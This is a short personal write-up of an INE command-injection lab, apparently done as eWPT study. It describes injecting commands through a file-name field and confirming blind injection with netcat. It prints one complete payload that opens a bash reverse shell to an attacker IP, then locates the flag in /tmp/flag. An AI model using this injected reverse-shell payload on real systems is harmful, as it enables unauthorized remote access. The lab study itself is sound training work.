2025-08-20 13:43

Status:

Tags: [[eWPT]] [[Tags/Command Injection|Command Injection]]
###### Prerequisites: 
# Command Injection Lab 1


### so this is the command injection lab in ine first it shows this website
![[Pics/Screenshot 2025-08-20 at 1.30.34 PM.png]]





### we need to look whats happening in burp suite
![[Pics/Screenshot 2025-08-20 at 1.31.48 PM.png]]


### so i think i can inject some codes withn the file name first add ; then write the code

![[Pics/Screenshot 2025-08-20 at 1.32.08 PM.png]]


### nothing is happening i think its a blind command injection so lets try a netcat
![[Pics/Screenshot 2025-08-20 at 1.33.10 PM.png]]

### no response that only means one thing
![[Pics/Screenshot 2025-08-20 at 1.33.13 PM.png]]

### it worked ! 
###  all i need to do now is upload a reverse shell to get into the system and have an RCE and get the flag
![[Pics/Screenshot 2025-08-20 at 1.35.49 PM.png]]


### Unfortunately i didn't take screenshot of the reverse shell but here's when it worked! its 
; bash -c 'bash -i >& /dev/tcp/192.105.241.2/4444 0>&1'
### but i don't know where is the flag

![[Pics/Screenshot 2025-08-20 at 1.40.03 PM 1.png]]


### i searched for the flag and found /tmp/flag
### so lets see what is inside it
![[Pics/Screenshot 2025-08-20 at 1.40.28 PM.png]]

### And here is the flag !